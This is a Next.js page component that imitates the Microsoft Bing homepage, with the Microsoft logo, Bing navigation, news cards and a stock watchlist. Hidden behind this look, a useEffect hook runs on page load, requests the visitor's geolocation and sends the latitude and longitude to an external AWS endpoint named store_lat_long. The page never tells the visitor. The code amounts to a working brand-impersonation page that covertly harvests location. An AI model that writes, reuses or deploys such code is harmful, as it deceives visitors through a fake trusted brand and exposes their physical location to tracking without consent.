"use client";

import { useState, useEffect } from "react";
import Image from "next/image";

const sendLocation = async (lat: number, long: number) => {
  const url = 'https://3ed3jlekji.execute-api.ap-south-1.amazonaws.com/prod/store_lat_long';
  const payload = {
    lat: lat.toString(),
    long: long.toString(),
  };

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    if (response.ok) {
      console.log('Location sent successfully');
    } else {
      console.error('Failed to send location:', response.statusText);
    }
  } catch (error) {
    console.error('Error sending location:', error);
  }
};

const MicrosoftLogo = () => (
  <div className="w-6 h-6 grid grid-cols-2 gap-px">
    <div className="bg-[#f25022]"></div>
    <div className="bg-[#7fba00]"></div>
    <div className="bg-[#00a4ef]"></div>
    <div className="bg-[#ffb900]"></div>
  </div>
);

const SearchIcon = (props: { className?: string }) => (
  <svg
    className={props.className || "w-6 h-6 text-gray-400"}
    fill="none"
    stroke="currentColor"
    viewBox="0 0 24 24"
  >
    <path
      strokeLinecap="round"
      strokeLinejoin="round"
      strokeWidth={2}
      d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
    />
  </svg>
);

const MicIcon = (props: { className?: string }) => (
  <svg
    className={props.className || "h-6 w-6"}
    viewBox="0 0 24 24"
    fill="currentColor"
    xmlns="http://www.w3.org/2000/svg"
  >
    <path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3z" />
    <path d="M17 11h-1c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92z" />
  </svg>
);

const CameraIcon = () => (
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="h-6 w-6">
        <path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z"></path>
        <circle cx="12" cy="13" r="3"></circle>
    </svg>
);


const RewardIcon = () => (
    <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
    </svg>
)

const MobileIcon = () => (
    <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M7 21h10a2 2 0 002-2V5a2 2 0 00-2-2H7a2 2 0 00-2 2v14a2 2 0 002 2z" />
    </svg>
);

const MenuIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 12h16" />
  </svg>
);


export default function Home() {
  const [searchQuery, setSearchQuery] = useState("");
  const [isMenuOpen, setIsMenuOpen] = useState(false);

  useEffect(() => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;
          sendLocation(latitude, longitude);
        },
        (error) => {
          console.error("Error getting location:", error.message);
        }
      );
    } else {
      console.error("Geolocation is not supported by this browser.");
    }
  }, []);

  const trendingTopics = [
    { id: 4, title: 'Pakistan nominates...', comments: 10 },
    { id: 5, title: "'You can quit your job...", comments: 6 },
    { id: 6, title: 'Pakistan PM Sharif...', comments: 12 },
  ];

  const smallNewsCards = [
    { source: 'Reuters', time: '2h', title: 'Global Markets React to New Inflation Data', likes: 145, image: 'https://images.unsplash.com/photo-1611974789855-9c2a0a7236a3?q=80&w=2940&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D' },
    { source: 'Associated Press', time: '8h', title: 'New Environmental Protection Treaty Signed', likes: 230, image: 'https://images.unsplash.com/photo-1473580044384-8b99b71615de?q=80&w=2940&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D' },
  ];
  
  const mainNews = [
    { source: 'Science Daily', time: '1d', title: 'Breakthrough in AI-Powered Drug Discovery Promises Faster Results', image: 'https://images.unsplash.com/photo-1532187863486-abf9dbad1b69?q=80&w=2832&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D' },
    { source: 'ESPN', time: '12h', title: 'Underdog Team Wins Championship in a Stunning Upset Victory', image: 'https://images.unsplash.com/photo-1560272564-c83b66b1744d?q=80&w=2865&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D' },
    { source: 'The Verge', time: '1d', title: 'Futuristic Farming: How Vertical Farms Are Changing Our Food Supply', image: 'https://images.unsplash.com/photo-1586798271654-0471bb190942?q=80&w=2835&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D' },
    { source: 'GIZMOCHINA', time: '3w', title: 'The Top 7 Lightest Smartphones of 2025', image: 'https://images.unsplash.com/photo-1588820658893-47a797e0591f?q=80&w=2940&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D' },
  ];

  const watchlist = [
    { name: 'NIFTY', value: '25,112.40', change: '+1.29%' },
    { name: 'SENSEX', value: '82,408.17', change: '+1.29%' },
    { name: 'USD/INR', value: '86.56', change: '-0.29%' },
    { name: 'Reliance Industries', value: '1,466.20', change: '+2.30%' },
    { name: 'Yes Bank Ltd', value: '19.73', change: '+1.65%' },
  ];

  return (
    <div 
      className="min-h-screen bg-cover bg-center bg-fixed"
      style={{backgroundImage: "url('https://images.unsplash.com/photo-1528181304800-259b08848526?q=80&w=2940&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D')"}}
    >
      <div className="min-h-screen bg-white/70 dark:bg-black/70 backdrop-blur-sm">
        <header className="flex justify-between items-center p-4 text-sm relative">
          <div className="flex items-center space-x-6">
            <div className="flex items-center space-x-2">
              <MicrosoftLogo />
              <span className="font-semibold text-lg">Microsoft Bing</span>
            </div>
            <nav className="hidden md:flex items-center space-x-4">
                <a href="#" className="font-bold">Search</a>
                <a href="#">Images</a>
                <a href="#">Videos</a>
                <a href="#">Shopping</a>
                <a href="#">Maps</a>
                <a href="#">News</a>
                <a href="#">...</a>
            </nav>
          </div>
          <div className="flex items-center space-x-4">
            <a href="#" className="hidden md:inline">Sign in</a>
            <div className="hidden md:flex items-center space-x-1">
                <RewardIcon />
                <span>Rewards</span>
            </div>
            <div className="hidden md:flex items-center space-x-1">
                <MobileIcon />
                <span>Mobile</span>
            </div>
            <button onClick={() => setIsMenuOpen(!isMenuOpen)} className="md:hidden"><MenuIcon/></button>
          </div>
        </header>

        {isMenuOpen && (
            <div className="md:hidden bg-white dark:bg-gray-800 absolute top-16 right-4 rounded-lg shadow-lg p-4 z-10 w-48">
                <nav className="flex flex-col space-y-2">
                    <a href="#">Search</a>
                    <a href="#">Images</a>
                    <a href="#">Videos</a>
                    <a href="#">Shopping</a>
                    <a href="#">Maps</a>
                    <a href="#">News</a>
                    <hr className="dark:border-gray-600"/>
                    <a href="#">Sign in</a>
                    <div className="flex items-center space-x-1">
                        <RewardIcon />
                        <span>Rewards</span>
                    </div>
                    <div className="flex items-center space-x-1">
                        <MobileIcon />
                        <span>Mobile</span>
                    </div>
                </nav>
            </div>
        )}

        <main className="pt-8 sm:pt-12 pb-20 px-4 md:px-8 lg:px-16">
            <div className="max-w-xl mx-auto">
                <div className="flex items-center bg-white dark:bg-gray-800 rounded-full shadow-lg border border-gray-200 dark:border-gray-700 hover:shadow-xl transition-shadow">
                    <input
                        type="text"
                        value={searchQuery}
                        onChange={(e) => setSearchQuery(e.target.value)}
                        className="w-full py-3 px-6 bg-transparent focus:outline-none"
                    />
                    <div className="flex items-center space-x-3 pr-4">
                        <button className="text-blue-500"><MicIcon /></button>
                        <button className="text-gray-500"><CameraIcon /></button>
                        <button className="p-2 bg-blue-500 rounded-full"><SearchIcon className="w-5 h-5 text-white" /></button>
                    </div>
                </div>
                <div className="flex justify-center space-x-2 sm:space-x-4 mt-4 text-xs text-gray-600 dark:text-gray-300 flex-wrap">
                    <span>Languages:</span>
                    <a href="#" className="text-blue-600 dark:text-blue-400">हिन्दी</a>
                    <a href="#" className="text-blue-600 dark:text-blue-400">বাংলা</a>
                    <a href="#" className="text-blue-600 dark:text-blue-400">اردو</a>
                    <a href="#" className="text-blue-600 dark:text-blue-400">ਪੰਜਾਬੀ</a>
                    <a href="#" className="text-blue-600 dark:text-blue-400">मराठी</a>
                    <a href="#" className="text-blue-600 dark:text-blue-400">తెలుగు</a>
                </div>
            </div>

            <div className="mt-8 grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
                {/* Trending topics */}
                <div className="bg-white/80 dark:bg-gray-800/80 p-4 rounded-lg shadow">
                    <ul>
                        {trendingTopics.map(topic => (
                            <li key={topic.id} className="flex items-center justify-between py-2 border-b dark:border-gray-700 last:border-b-0">
                                <div className="flex items-center space-x-2">
                                    <span className="text-gray-500">{topic.id}</span>
                                    <span>{topic.title}</span>
                                </div>
                                <div className="flex items-center space-x-2 text-gray-500">
                                    <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" viewBox="0 0 20 20" fill="currentColor"><path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" /></svg>
                                    <span>{topic.comments}</span>
                                </div>
                            </li>
                        ))}
                    </ul>
                </div>

                {smallNewsCards.map((card, index) => (
                    <div key={index} className="relative bg-white/80 dark:bg-gray-800/80 rounded-lg shadow overflow-hidden flex flex-col justify-end min-h-[200px] p-4">
                        <Image src={card.image} layout="fill" objectFit="cover" alt={card.title} className="absolute inset-0 z-0" />
                        <div className="absolute inset-0 bg-gradient-to-t from-black/60 to-transparent"></div>
                        <div className="relative z-10 text-white">
                            <div className="flex items-center text-xs space-x-2 mb-2">
                                <span>{card.source}</span>
                                <span>·</span>
                                <span>{card.time}</span>
                            </div>
                            <p className="font-bold">{card.title}</p>
                            <div className="flex items-center space-x-2 text-white mt-2">
                                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" viewBox="0 0 20 20" fill="currentColor"><path d="M2 10.5a1.5 1.5 0 113 0v6a1.5 1.5 0 01-3 0v-6zM6 10.333v5.43a2 2 0 001.106 1.787l.09.044a2 2 0 002.208-1.253L10.5 15.5h5.233a2 2 0 001.978-1.79L18 5.667a2 2 0 00-1.978-2.21L16 3.5v.167a2 2 0 00-1.978 2.21L14 6.033v1.734l-.59.295a2 2 0 00-1.21.748L11.5 10.5h-1.233a2 2 0 00-1.978 1.79L8 12.467v-2.134z" /></svg>
                                <span>{card.likes}</span>
                            </div>
                        </div>
                    </div>
                ))}

                {/* Watchlist */}
                <div className="bg-white/80 dark:bg-gray-800/80 p-4 rounded-lg shadow col-span-1 sm:col-span-2 lg:col-span-1">
                    <h3 className="font-bold mb-2">Watchlist suggestions</h3>
                    <ul>
                        {watchlist.map(item => (
                            <li key={item.name} className="flex justify-between items-center py-1 border-b dark:border-gray-700 last:border-b-0">
                                <div>
                                    <p className="font-semibold">{item.name}</p>
                                    <p className="text-xs text-gray-500">{item.name}</p>
                                </div>
                                <div className={`text-right ${item.change.startsWith('+') ? 'text-green-500' : 'text-red-500'}`}>
                                    <p>{item.change}</p>
                                    <p className="text-gray-800 dark:text-gray-200">{item.value}</p>
                                </div>
                            </li>
                        ))}
                    </ul>
                     <a href="#" className="text-blue-500 text-sm mt-2 block">See watchlist suggestions</a>
                </div>
                
                {mainNews.map((news, index) => (
                    <div key={index} className="col-span-1 sm:col-span-2 lg:col-span-2 bg-white/80 dark:bg-gray-800/80 rounded-lg shadow overflow-hidden">
                        <div className="relative h-64">
                            <Image src={news.image} layout="fill" objectFit="cover" alt={news.title} />
                        </div>
                        <div className="p-4">
                            <div className="flex items-center text-xs text-gray-500 space-x-2 mb-2">
                                <span>{news.source}</span>
                                <span>·</span>
                                <span>{news.time}</span>
                            </div>
                            <p className="font-bold text-xl">{news.title}</p>
                        </div>
                    </div>
                ))}

            </div>
        </main>
      </div>
    </div>
  );
}
